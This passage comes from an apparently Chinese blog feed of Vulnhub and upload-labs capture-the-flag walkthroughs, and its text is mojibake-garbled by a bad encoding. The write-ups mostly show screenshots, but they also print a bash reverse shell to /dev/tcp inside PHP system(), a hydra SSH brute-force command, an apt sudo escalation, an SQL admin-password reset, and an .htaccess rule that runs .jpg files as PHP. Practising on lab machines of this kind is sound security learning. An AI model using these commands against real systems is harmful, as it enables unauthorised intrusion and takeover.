alt="image-20210818110536001"></p><p>ææƒè¾…åŠ©è„šæœ¬ <code>linpeas.sh</code>è¿è¡Œä¸äº†ï¼Œä½†æ˜¯<code>LinEnum.sh</code>å¯ä»¥è¿è¡Œï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆä¸œè¥¿</p><blockquote><p>è§£å†³linpeas.shä¸èƒ½è¿è¡Œçš„åŸå› æ˜¯ä¸åŒç³»ç»Ÿçš„æ¢è¡Œç¬¦ä¸ä¸€æ ·</p><p>é€šè¿‡vi/vimè¿›å…¥æƒ³è¦ä¿®æ”¹çš„æ–‡ä»¶ï¼ŒæŒ‰ä¸‹<code>:</code>è¿›å…¥æœ«è¡Œæ¨¡å¼ï¼Œè¾“å…¥<code>set fileformat=unix</code>ç„¶åé€€å‡ºå³å¯</p></blockquote><p>çœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°è¿™ä¸ªå®šæ—¶ä»»åŠ¡ä¼šå®šæ—¶å†™å…¥å¯†ç åˆ°æ ¹ç›®å½•ï¼Œä½†æ˜¯æœ¬åœ°æ²¡æœ‰çœ‹è§</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113323440.png" alt="image-20210818113323440"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113306024.png" alt="image-20210818113306024"></p><p>çœ‹äº†ä¸€ä¸‹å®šæ—¶æ‰§è¡Œçš„æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113614313.png" alt="image-20210818113614313"></p><p>å°†æœ¬åœ°quietæ–‡ä»¶æ¸…ç©ºä¹‹åæ‰ä¼šåœ¨æ ¹ç›®å½•å†™å…¥æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113950755.png" alt="image-20210818113950755"></p><blockquote><p>è¿™ä¸ªçº¯è„‘æ´äº†</p></blockquote><p>å‚è€ƒæ–‡ç« </p><p><a href="https://www.mondayice.com/2021/06/03/vulnhub-grotesque2-writeup/">https://www.mondayice.com/2021/06/03/vulnhub-grotesque2-writeup/</a></p><h2 id="åä¸€ã€Shenron"><a href="#åä¸€ã€Shenron" class="headerlink" title="åä¸€ã€Shenron"></a>åä¸€ã€Shenron</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.22</p></blockquote><p>ä¸­è§„ä¸­çŸ©çš„å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818124158708.png" alt="image-20210818124158708"></p><p>æ‰«æä¸€ä¸‹ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹å‘ç°ä¹Ÿæ˜¯<code>joomla</code>æ¡†æ¶ï¼Œç½‘ä¸Šå¯»æ‰¾ä»¥åŠå­˜åœ¨çš„æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818130358222.png" alt="image-20210818130358222"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818130336047.png" alt="image-20210818130336047"></p><p> <img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818131204412.png" alt="image-20210818131204412"></p><p>æˆåŠŸç™»å½•åå°ï¼Œåœ¨åå°æ¨¡æ¿ä¿®æ”¹å¤„å†™å…¥æœ¨é©¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818131739088.png" alt="image-20210818131739088"></p><p>ä¸Šä¼ åå¼¹shellçš„è„šæœ¬ï¼Œç„¶åè·å–åˆ°shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132014354.png" alt="image-20210818132014354"></p><p>åœ¨é…ç½®æ–‡ä»¶ä¸­è·å–åˆ°ä¸€ä¸ªç”¨æˆ·çš„å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132346703.png" alt="image-20210818132346703"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132636520.png" alt="image-20210818132636520"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132836615.png" alt="image-20210818132836615"></p><blockquote><p>å¯ä»¥åˆ©ç”¨cpå°†sshæ–‡ä»¶å¤åˆ¶åˆ°è¿™ä¸ªç”¨æˆ·çš„.sshæ–‡ä»¶ä¸­å®ç°ä½¿ç”¨å¯†é’¥ç™»å½•</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818134922962.png" alt="image-20210818134922962"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818134736523.png" alt="image-20210818134736523"></p><p>è·å¾—ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135200504.png" alt="image-20210818135200504"></p><p>åˆ©ç”¨å¯†é’¥<code>scp</code>æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135538855.png" alt="image-20210818135538855"></p><p>ä½¿ç”¨<code>pspy64</code>ç›‘æ§è¿›ç¨‹æ²¡æœ‰å‘ç°ç‰¹æ®Šçš„ä¸œè¥¿</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135839321.png" alt="image-20210818135839321"></p><p>ä½¿ç”¨è¾…åŠ©ææƒè„šæœ¬<code>linpeas.sh</code>æ‰«æä¸€ä¸‹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818140751728.png" alt="image-20210818140751728"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818140909918.png" alt="image-20210818140909918"></p><p>åˆ—å‡ºè‡ªå·±çš„æƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141136095.png" alt="image-20210818141136095"></p><p>ä½¿ç”¨aptææƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">æ‰§è¡Œå‘½ä»¤ï¼šsudo apt changelog apt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141645808.png" alt="image-20210818141645808"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141559490.png" alt="image-20210818141559490"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141509574.png" alt="image-20210818141509574"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141537570.png" alt="image-20210818141537570"></p><p><strong>é—®é¢˜</strong></p><ol><li><p>åœ¨ç”¨æˆ·<code>/home/jenny</code>çš„ç›®å½•ä¸‹ç›´æ¥å¤åˆ¶æ–‡ä»¶ä¸€ç›´ä¸æˆåŠŸï¼Œåˆ°<code>tmp</code>ç›®å½•ä¸‹å°±å¯ä»¥äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135103119.png" alt="image-20210818135103119"></p></li></ol><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªå¤–ç½‘ç›¸å¯¹ç®€å•ï¼Œä¸»æœºææƒçš„ä¹‹å‰ç”¨æˆ·çš„ææƒæ˜¯å¸¸è§„çš„ï¼Œæœ€åçš„aptææƒæ˜¯æ–°æ‰‹æ³•ä¹‹å‰æ€»ç»“æ²¡æœ‰å‘ç°è¿™ä¸ªä¸œè¥¿</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://nepcodex.com/2021/06/shenron-1-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/shenron-1-walkthrough-vulnhub-writeup/</a></p><h2 id="åäºŒã€VulnCMS"><a href="#åäºŒã€VulnCMS" class="headerlink" title="åäºŒã€VulnCMS"></a>åäºŒã€VulnCMS</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.23</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818143156065.png" alt="image-20210818143156065"></p><blockquote><p>æ¯ä¸ªç«¯å£éƒ½æœ‰ä¸åŒçš„CMS</p></blockquote><p>80ç«¯å£<code>w3.css</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145137572.png" alt="image-20210818145137572"></p><p>5000ç«¯å£ <code>wordpress</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145152326.png" alt="image-20210818145152326"></p><p>8081ç«¯å£<code>joomla</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145230133.png" alt="image-20210818145230133"></p><p>9001ç«¯å£<code>Drupal</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145318575.png" alt="image-20210818145318575"></p><p>åœ¨æ¼æ´åº“æ‰¾åˆ°ä¸€äº›æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818150304048.png" alt="image-20210818150304048"></p><p><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-6920)/">Drupal - ç™½é˜æ–‡åº“</a></p><p>POC&amp;EXP <a href="https://github.com/zhzyker/exphub/tree/master/drupal">https://github.com/zhzyker/exphub/tree/master/drupal</a></p><p>æ‰§è¡ŒPOCæ£€æŸ¥æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818151606122.png" alt="image-20210818151606122"></p><p>æ‰§è¡ŒEXPï¼Œä½†æ˜¯æ²¡æœ‰æ•ˆæœ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818151825622.png" alt="image-20210818151825622"></p><p>ä½¿ç”¨MSFè·å–åˆ°shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818152555291.png" alt="image-20210818152555291"></p><p>çœ‹åˆ°äº†joomlaCMSçš„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818153820771.png" alt="image-20210818153820771"></p><blockquote><p>:cry:  ä¸ºä»€ä¹ˆè¿™ä¸ªå¯†ç ä¸å¯¹å•Šï¼ŒçœŸæ­£çš„å¯†ç åœ¨è¿™ä¸ªé‡Œé¢ï¼Œè¿™ä¸ªæ–‡ä»¶æœ‰ä»€ä¹ˆç‰¹æ®Šçš„å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818154020985.png" alt="image-20210818154020985"></p><p>ç™»å½•<code>joomla</code>åå°ä¹‹åä¸èƒ½æŒ‰ç…§ä»¥å‰çš„æ–¹æ³•è·å–åˆ°shellï¼Œå¡ä½äº†â€¦â€¦ </p><p>ä¸ºä»€ä¹ˆç”¨æˆ·é‚®ç®±ä¼šè”æƒ³åˆ°å¯†ç â€¦â€¦â€¦â€¦â€¦â€¦</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155116079.png" alt="image-20210818155116079"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155032435.png" alt="image-20210818155032435"></p><p>è·å–åˆ°flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155144741.png" alt="image-20210818155144741"></p><p>ç›‘æ§è¿›ç¨‹å‘ç°æ²¡æœ‰å®šæ—¶è„šæœ¬æ‰§è¡Œï¼Œä½¿ç”¨ææƒè¾…åŠ©è„šæœ¬æ‰«æ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818160300843.png" alt="image-20210818160300843"></p><blockquote><p>è¿™é‡Œå¦‚æœæ¢åˆ°ghostç”¨æˆ·å¯èƒ½å¯ä»¥ä½¿ç”¨lxdææƒ</p></blockquote><p>æ‰¾åˆ°äº†ä¸€ä¸ªç”¨æˆ·ï¼Œå¯èƒ½ä¼šæœ‰å¯†ç å­˜åœ¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162324252.png" alt="image-20210818162324252"></p><p>è¯»å–æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162419611.png" alt="image-20210818162419611"></p><p>æˆåŠŸåˆ‡æ¢ç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162455942.png" alt="image-20210818162455942"></p><p>æŸ¥çœ‹å¯ä»¥ä½¿ç”¨sudoæ‰§è¡Œçš„å‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162552860.png" alt="image-20210818162552860"></p><p>ææƒåˆ°root</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162656056.png" alt="image-20210818162656056"></p><p>è·å–åˆ°æœ€åä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162723639.png" alt="image-20210818162723639"></p><p><strong>æ€»ç»“</strong></p><p>åœ¨é‡è§å¤šä¸ªCMSçš„æ—¶å€™éœ€è¦æŸ¥æ‰¾CMSçš„å†å²æ¼æ´å°è¯•æ”»å‡»ï¼Œè¿˜éœ€è¦è‡ªå·±åŠ¨æ‰‹å‘ç°ï¼Œå¯¹äºè·å–åˆ°çš„ä¿¡æ¯éœ€è¦ç»†å¿ƒæŸ¥çœ‹ä¸è¦å¿½ç•¥</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://nepcodex.com/2021/06/vulncms-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/vulncms-walkthrough-vulnhub-writeup/</a></p><h2 id="åä¸‰ã€POTATO"><a href="#åä¸‰ã€POTATO" class="headerlink" title="åä¸‰ã€POTATO"></a>åä¸‰ã€POTATO</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>Win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.24</p></blockquote><p>æ‰«æç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095443334.png" alt="image-20210819095443334"></p><blockquote><p>7120ç«¯å£å¼€æ”¾ä½†æ˜¯å¹¶ä¸èƒ½ç›´æ¥è®¿é—®åˆ°</p></blockquote><p>ä»”ç»†æ‰«æåå‘ç°7120æ˜¯sshç«¯å£<code>sudo nmap -sSV -vv -sC -T4 -p- 192.168.1.24</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819100445429.png" alt="image-20210819100445429"></p><p>æ‰«æä¸€ä¸‹ç›®å½•ï¼Œå‘ç°äº†ä¸€ä¸ªphpinfoçš„ç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095559065.png" alt="image-20210819095559065"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095627149.png" alt="image-20210819095627149"></p><blockquote><p>çœ‹åˆ°PHPINFOçš„ç•Œé¢ï¼Œæƒ³åˆ°äº†æœ¬åœ°æ–‡ä»¶åŒ…å«</p></blockquote><p>æ²¡æœ‰åœ¨phpinfoä¸­çœ‹åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ€è·¯æ–­äº†â€¦â€¦ï¼Œä½œè€…ç»™å‡ºäº†HINT</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819101146263.png" alt="image-20210819101146263"></p><p>å°è¯•ä½¿ç”¨<code>potato</code>çˆ†ç ´sshå¯†ç </p><p><code>hydra 192.168.1.24 ssh -s 7120 -p potato -P /usr/share/worldlists/rockyou.txt -t 6 -v -f</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819102656060.png" alt="image-20210819102656060"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819102754034.png" alt="image-20210819102754034"></p><p>ææƒ</p><p>ä½¿ç”¨pspy64ç›‘æ§è¿›ç¨‹ï¼Œå¹¶æ²¡æœ‰å‘ç°ç‰¹æ®Šæƒ…å†µ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819103627063.png" alt="image-20210819103627063"></p><p><code>linpeas.sh</code>è¾…åŠ©ææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819104309153.png" alt="image-20210819104309153"></p><p>å†…æ ¸æ¼æ´ææƒï¼Œå…ˆä½¿ç”¨è„šæœ¬æ‰«æä¸€ä¸‹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819105331542.png" alt="image-20210819105331542"></p><blockquote><p>è„ç‰›æœ¬åœ°ææƒï¼š<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p></blockquote><p>è¿™ä¸ªæ¼æ´ä¸è¡Œï¼Œå¼€å§‹æ‰§è¡Œä¸»æœºå°±å´©æ‰äº†ï¼Œæ¢ä¸€ä¸ª</p><p>ä½¿ç”¨CVE-2015-1328  EXPä¸‹è½½ï¼š<a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819112403241.png" alt="image-20210819112403241"></p><p>ææƒæˆåŠŸ</p><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªé¶åœºç›´æ¥ç»•è¿‡å¤–ç½‘çˆ†ç ´sshæœ‰ç‚¹éš¾é¡¶ï¼Œå¯¹äºå†…æ ¸ææƒæ¼æ´ï¼Œè„ç‰›ç›´æ¥æŠŠç”µè„‘æ‰“å´©äº†è¿™ä¸ªæœ‰ç‚¹æ„å¤–ï¼Œç½‘ä¸Šæ²¡çœ‹è§è¿™ä¸ªæƒ…å†µï¼Œå…¶ä»–è¿˜è¡Œéƒ½æ˜¯å¸¸è§„æ­¥éª¤</p><h2 id="åå››ã€BOVERFLOW"><a href="#åå››ã€BOVERFLOW" class="headerlink" title="åå››ã€BOVERFLOW"></a><del>åå››ã€BOVERFLOW</del></h2><blockquote><p>kaliï¼š192.168.1.15</p><p>Win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.25</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819123723015.png" alt="image-20210819123723015"></p><p>ç«¯å£å¼€æ”¾æƒ…å†µ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819113326332.png" alt="image-20210819113326332"></p><p>æ‰«æç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819114205992.png" alt="image-20210819114205992"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819114148419.png" alt="image-20210819114148419"></p><blockquote><p>å±…ç„¶è¿˜å°æˆ‘ip</p></blockquote><p>æ€è·¯å¡ä½äº†ï¼ŒåŠ¨ä¸äº†äº†</p><h2 id="åå››ã€DevContainer"><a href="#åå››ã€DevContainer" class="headerlink" title="åå››ã€DevContainer"></a>åå››ã€DevContainer</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>Win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.26</p></blockquote><p>è¿™åªå¼€æ”¾äº†80ç«¯å£ï¼Œæ‰«æç›®å½•å‘ç°æœ‰ä¸ªuploadé¡µé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819125856482.png" alt="image-20210819125856482"></p><p>ç›´æ¥åœ¨<code>/upload</code>ä¸‹ä¸Šä¼ å³å¯ï¼Œå¹¶æ²¡æœ‰ä»»ä½•é™åˆ¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819130359077.png" alt="image-20210819130359077"></p><p>åˆ©ç”¨ç½‘ç«™ä¸­çš„å®šæ—¶è„šæœ¬åå¼¹shell</p><blockquote><p>ä¹‹å‰ä½¿ç”¨ cp /bin/bash /tmp/bash å¤±è´¥åº”è¯¥æ˜¯æƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥ç›´æ¥å°è¯•åå¼¹shell</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132019403.png" alt="image-20210819132019403"></p><p>æŸ¥çœ‹æœ‰æƒé™æ‰§è¡Œçš„å‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132313762.png" alt="image-20210819132313762"></p><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªæœ¬åœ°ç«¯å£è½¬å‘çš„å‘½ä»¤ï¼Œå°†90ç«¯å£è½¬å‘åˆ°8080ç«¯å£ï¼Œä¹‹åå†ç«¯å£çš„åœ°æ–¹å‘ç°ä¸€ä¸ªæ–‡ä»¶è¯»å–æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132846728.png" alt="image-20210819132846728"></p><p>åå¼¹shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133350657.png" alt="image-20210819133350657"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133404477.png" alt="image-20210819133404477"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133438221.png" alt="image-20210819133438221"></p><p><strong>æ€»ç»“</strong></p><p>é€šè¿‡è¿™ä¸ªå¹³å°æ›´åŠ æ·±äº†æˆ‘å¯¹æƒé™çš„ç†è§£ï¼Œå¯¹äºå„ä¸ªæœåŠ¡å¼€å¯çš„ç”¨æˆ·æ˜¯ä»€ä¹ˆæƒé™ï¼Œæ‰§è¡Œå‘½ä»¤çš„å°±æ˜¯ä»€ä¹ˆæƒé™</p><h2 id="åäº”ã€MY-CMSMS"><a href="#åäº”ã€MY-CMSMS" class="headerlink" title="åäº”ã€MY CMSMS"></a>åäº”ã€MY CMSMS</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>Win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.27</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819140138106.png" alt="image-20210819140138106"></p><p>æ‰«æç›®å½•ï¼Œå¯¹ç½‘ç«™è§‚å¯Ÿä»¥ä¸€ç•ªï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°å‰å°æœ‰ä»€ä¹ˆæ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144813495.png" alt="image-20210819144813495"></p><p>ä½†æ˜¯è¿™ä¸ªå¯ä»¥åˆ©ç”¨å¼±å£ä»¤è¿œç¨‹è¿æ¥æ•°æ®åº“â€¦â€¦</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819143920428.png" alt="image-20210819143920428"></p><p>æ›´æ–°ç”¨æˆ·å¯†ç </p><p><a href="http://blog.is36.com/archives/447/">CMS Made Simpleå¿˜è®°å¯†ç </a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> cms_users <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> = (<span class="hljs-keyword">select</span> <span class="hljs-keyword">md5</span>(<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">IFNULL</span>((<span class="hljs-keyword">SELECT</span> sitepref_value <span class="hljs-keyword">FROM</span> cms_siteprefs <span class="hljs-keyword">WHERE</span> sitepref_name = <span class="hljs-string">&#x27;sitemask&#x27;</span>),<span class="hljs-string">&#x27;&#x27;</span>),<span class="hljs-string">&#x27;admin&#x27;</span>))) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819143602387.png" alt="image-20210819143602387"></p><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆæ›´æ–°å¯†ç å‘¢ï¼Ÿ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144351232.png" alt="image-20210819144351232"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144420874.png" alt="image-20210819144420874"></p><blockquote><p>è¿™ä¸ªç½‘ç«™çš„å¯†ç è¿˜åœ¨å‰é¢æ·»åŠ äº†å‰ç¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹å¯†ç ï¼Œè¿˜éœ€è¦æ·»åŠ ä¸Šç›¸åº”çš„å­—ç¬¦å‰ç¼€</p></blockquote><p>åå°æ‰§è¡Œphpä»£ç åå¼¹shell</p><p><code>system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.15/1234 0&gt;&amp;1&#39;&quot;);</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819150528510.png" alt="image-20210819150528510"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819150542954.png" alt="image-20210819150542954"></p><p>çœ‹åˆ°äº†ä¸¤ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œä½¿ç”¨johnæ¥ç ´è§£åŠ å¯†çš„å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819151830970.png" alt="image-20210819151830970"></p><blockquote><p>æ²¡æœ‰ç ´è§£å‡ºæ¥</p></blockquote><p>åœ¨ç½‘ç«™çš„<code>admin</code>ç›®å½•ä¸‹ï¼Œæœ‰ä¸€ä¸ª<code>.htpasswd</code>æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819153651796.png" alt="image-20210819153651796"></p><p>å…ˆbase64è§£ç ç„¶åä½¿ç”¨base32è§£ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152218458.png" alt="image-20210819152218458"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152353530.png" alt="image-20210819152353530"></p><p>ä¸èƒ½ä½¿ç”¨å¯†ç è¿æ¥sshï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨åå¼¹å›æ¥çš„shellåˆ‡æ¢ç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152640506.png" alt="image-20210819152640506"></p><p>ç›´æ¥åˆ©ç”¨pythonææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152808250.png" alt="image-20210819152808250"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152831931.png" alt="image-20210819152831931"></p><p><strong>æ€»ç»“</strong></p><p>å¯¹äºå¤–ç½‘æ¸—é€ï¼Œè¿˜æ˜¯ç¼ºå°‘ä¸€ç‚¹æƒ³æ³•ï¼Œéœ€è¦å¤šåŠ ç»ƒä¹ æé«˜å¯¹æ¼æ´çš„æ•æ„Ÿåº¦ï¼Œå¯¹äºLinuxçš„ææƒä¹Ÿæ˜¯æ¯”è¾ƒç†Ÿæ‚‰äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vulnhub&quot;&gt;&lt;a href=&quot;#Vulnhub&quot; class=&quot;headerlink&quot; title=&quot;Vulnhub&quot;&gt;&lt;/a&gt;Vulnhub&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;https://www.vul</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="é¶åœº" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ é¶åœº</title>
    <link href="http://example.com/2021/09/04/upload-labs/"/>
    <id>http://example.com/2021/09/04/upload-labs/</id>
    <published>2021-09-04T04:12:12.000Z</published>
    <updated>2021-09-22T02:30:36.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210917090552341.png" alt="image-20210917090552341"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>ä¸Šä¼  <code>.htaccess</code> </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>æ–‡ä»¶ä¼šè‡ªåŠ¨é‡å‘½åæ‰€ä»¥ä¸èƒ½ä¸Šä¼  <code>.htaccess</code> æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916150810180.png" alt="image-20210916150810180"></p><p>å¯ä»¥å¤§å°å†™ç»•è¿‡ä¸Šä¼ ä½†æ˜¯ç³»ç»Ÿå¥½åƒä¸èƒ½è§£æï¼Œè®¿é—®åˆ°çš„ç»“æœæ˜¯é”™è¯¯çš„</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916151446824.png" alt="image-20210916151446824"></p><p>ä¸ä¹‹å‰ç›¸æ¯”å»æ‰äº†é™¤å»ç©ºæ ¼çš„å‡½æ•°</p><p>æœ«å°¾åŠ ç©ºæ ¼å³å¯ç»•è¿‡ä¸Šä¼  </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916151421240.png" alt="image-20210916151421240"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916153630164.png" alt="image-20210916153630164"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916153800164.png" alt="image-20210916153800164"></p><p><code>.htaccess</code> æ–‡ä»¶ä¸èƒ½ä¸Šä¼ </p><p><img 